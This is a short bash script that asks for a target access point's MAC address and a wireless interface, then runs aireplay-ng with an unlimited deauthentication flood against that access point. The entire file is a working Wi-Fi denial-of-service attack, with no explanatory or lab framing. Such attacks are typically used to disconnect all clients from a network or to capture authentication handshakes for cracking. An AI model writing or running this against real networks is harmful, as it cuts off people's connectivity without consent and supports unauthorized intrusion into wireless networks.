#!/bin/bash

echo "Input the MAC Address again: "
read macaddr

echo "Input your interface: "
read moninterface

sudo aireplay-ng --deauth 0 -a $macaddr $moninterface
